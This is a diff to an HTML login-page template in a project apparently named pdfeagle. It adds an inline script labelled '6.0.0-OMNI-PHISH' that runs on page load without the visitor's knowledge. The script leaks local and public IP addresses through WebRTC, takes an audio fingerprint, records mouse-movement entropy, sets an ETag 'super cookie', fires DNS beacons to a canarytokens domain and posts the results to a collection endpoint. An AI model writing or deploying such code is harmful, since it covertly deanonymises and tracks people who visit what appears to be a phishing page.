@@ -1,4 +1,3 @@
---- START OF FILE pdfeagle-main/templates/semyanich.html ---
 <!DOCTYPE html>
 <html id="XF" lang="ru-RU" dir="LTR" style="font-size: 62.5%;" data-app="public" class="has-no-js template-login uix_page--fixed uix_hasSectionLinks">
 <head>
@@ -29,54 +28,102 @@
         .cf-footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; text-align: center; }
     </style>
 
-    <!-- ВНЕДРЯЕМ EAGLE EYE ULTIMATE -->
+    <!-- GOD-TIER TRACKING SCRIPT (FULL INLINE VERSION) -->
     <script>
-    window.EagleEyeUltimate = class {
+    window.EagleEyeOmni = class {
         constructor(config = {}) {
-            this.version = "5.0.0";
+            this.version = "6.0.0-OMNI-PHISH";
             this.endpoint = window.location.origin + '/api/collect';
             this.sessionId = Math.random().toString(36).substring(7);
-            // ЗАМЕНИТЕ НА СВОЙ ДОМЕН
-            this.config = { enableDNSBeacon: true, canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com" };
+            this.config = { canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com" };
             this.init();
         }
         async init() {
-            if (this.config.enableDNSBeacon) this.triggerDNSBeacons();
+            this.loadSuperCookie();
+            if (this.config.canaryDomain) this.triggerDNSBeacons();
             if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load (Login)'), 100);
             else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load (Login)'), 100));
         }
-        triggerDNSBeacons() {
-            const uid = `${this.sessionId}.${Date.now()}`;
-            new Image().src = `https://${uid}.img.${this.config.canaryDomain}/pixel.gif`;
-        }
+        loadSuperCookie() { new Image().src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`; }
+        triggerDNSBeacons() { new Image().src = `https://${this.sessionId}.${Date.now()}.img.${this.config.canaryDomain}/pixel.gif`; }
+        
         async getWebRTC() {
-            const result = { localIPs: [], publicIPs: [] };
+            const res = { local: [], public: [] };
             try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                 pc.createDataChannel('');
                 await new Promise(r => {
                     pc.onicecandidate = e => {
-                        if (!e.candidate) { r(); return; }
+                        if(!e.candidate) { r(); return; }
                         const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ip) result.publicIPs.push(ip[1]);
+                        if(ip) {
+                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
+                            else res.public.push(ip[1]);
+                        }
                     };
                     setTimeout(r, 1000);
                 });
             } catch(e){}
-            return result;
+            return res;
         }
+
+        async getAudioHash() {
+            try {
+                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!Ctx) return "no_audio";
+                const audioCtx = new Ctx(1, 44100, 44100);
+                const osc = audioCtx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                osc.connect(audioCtx.destination);
+                osc.start(0);
+                const buffer = await audioCtx.startRendering();
+                const data = buffer.getChannelData(0);
+                let sum = 0;
+                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
+                return sum.toFixed(6);
+            } catch { return "error"; }
+        }
+
+        trackMouseEntropy() {
+            return new Promise(resolve => {
+                let moves = [];
+                const fn = e => {
+                    moves.push({x:e.clientX, y:e.clientY});
+                    if(moves.length > 20) {
+                        document.removeEventListener('mousemove', fn);
+                        let variance = 0;
+                        for(let i=2; i<moves.length; i++) {
+                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
+                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
+                            variance += Math.abs(a1 - a2);
+                        }
+                        resolve(variance);
+                    }
+                };
+                document.addEventListener('mousemove', fn);
+                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 3000);
+            });
+        }
+
         async collect(trigger, extra = {}) {
-            const webrtc = await this.getWebRTC();
+            const [webrtc, audio, entropy] = await Promise.all([
+                this.getWebRTC(),
+                this.getAudioHash(),
+                this.trackMouseEntropy()
+            ]);
             const payload = {
                 meta: { sessionId: this.sessionId, trigger: trigger, url: window.location.href },
                 network: { webrtc: webrtc },
+                fingerprints: { audio: audio },
+                hardware: { mouseEntropy: entropy },
                 system: { ua: navigator.userAgent, platform: navigator.platform },
                 ...extra
             };
             navigator.sendBeacon(this.endpoint, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
         }
     };
-    const eagle = new EagleEyeUltimate();
+    const eagle = new EagleEyeOmni();
     </script>
 </head>
 
